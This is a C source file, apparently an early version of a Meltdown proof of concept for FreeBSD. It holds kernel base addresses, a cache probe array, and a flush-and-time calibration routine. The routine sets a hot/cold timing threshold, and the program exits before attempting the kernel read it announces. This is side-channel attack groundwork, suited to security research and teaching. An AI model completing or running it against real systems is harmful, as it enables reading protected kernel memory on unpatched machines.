/*-
 * Copyright (c) 2018 The University of Oslo
 * Copyright (c) 2018 Dag-Erling Smørgrav
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

/*
 * Demonstration of the Meltdown attack on FreeBSD
 *
 * https://meltdownattack.com/
 */

#include <err.h>
#include <limits.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/*
 * Assembler functions
 */
void clflush(const void *addr);
void rflush(const void *addr, size_t n, size_t step);
uint64_t rdtsc64(void);
uint32_t rdtsc32(void);
uint64_t timeread(const void *);

/*
 * Kernel base address for a few platforms
 */
#if __amd64__
#define KERNBASE	0xffffffff80000000UL
#elif __i386__
#define KERNBASE	0xc0000000U
#else
#error "Unsupported architecture"
#endif

/*
 * Address and length of data to read
 */
static uintptr_t addr;
static size_t len;
#define DEFAULT_ADDR	KERNBASE
#define DEFAULT_LEN	16

/*
 * Probe array
 */
static uint8_t probe[256 * 4096];

/*
 * Threshold between presumed hot and presumed cold reads
 */
static uint64_t threshold;

/*
 * Compute the average hot and cold read latency and derive the threshold.
 */
#define N 1048576
static void
calibrate(void)
{
	uint64_t avg_cold, avg_hot;
	uint64_t meas, min, max, sum;

	warnx("calibrating...");

	/* compute average latency of "cold" access */
	min = UINT64_MAX;
	max = 0;
	sum = 0;
	for (unsigned int i = 0; i < N + 2; ++i) {
		clflush(&probe);
		meas = timeread(&probe);
		if (meas < min)
			min = meas;
		if (meas > max)
			max = meas;
		sum += meas;
	}
	sum -= min;
	sum -= max;
	avg_cold = sum / N;
	warnx("average cold read: %llu", (unsigned long long)avg_cold);

	/* compute average latency of "hot" access */
	meas = timeread(&probe);
	min = UINT64_MAX;
	max = 0;
	sum = 0;
	for (unsigned int i = 0; i < N + 2; ++i) {
		meas = timeread(&probe);
		if (meas < min)
			min = meas;
		if (meas > max)
			max = meas;
		sum += meas;
	}
	sum -= min;
	sum -= max;
	avg_hot = sum / N;
	warnx("average hot read: %llu", (unsigned long long)avg_hot);

	/* set threshold to the average of the two */
	threshold = (avg_hot + avg_cold) / 2;
	warnx("threshold: %llu", (unsigned long long)threshold);
}

/*
 * Print usage string and exit.
 */
static void
usage(void)
{

	fprintf(stderr, "usage: meltdown [-a addr] [-n len]\n");
	exit(1);
}

int
main(int argc, char *argv[])
{
	uintmax_t umax;
	char *end;
	int opt;

	while ((opt = getopt(argc, argv, "a:n:")) != -1)
		switch (opt) {
		case 'a':
			if (addr != 0)
				usage();
			umax = strtoull(optarg, &end, 16);
			if (end == optarg || *end != '\0')
				errx(1, "invalid address");
			addr = umax;
			if ((uintmax_t)addr != umax)
				errx(1, "address is out of range");
			break;
		case 'n':
			if (len != 0)
				usage();
			umax = strtoull(optarg, &end, 0);
			if (end == optarg || *end != '\0')
				errx(1, "invalid length");
			len = umax;
			if (len == 0 || (uintmax_t)len != umax)
				errx(1, "length is out of range");
			break;
		default:
			usage();
		}

	argc -= optind;
	argv += optind;

	if (argc)
		usage();

	/* default address and length */
	if (addr == 0)
		addr = DEFAULT_ADDR;
	if (len == 0)
		len = DEFAULT_LEN;

	warnx("Attempting to read %zu bytes from %p", len, (void *)addr);

	calibrate();

	exit(0);
}
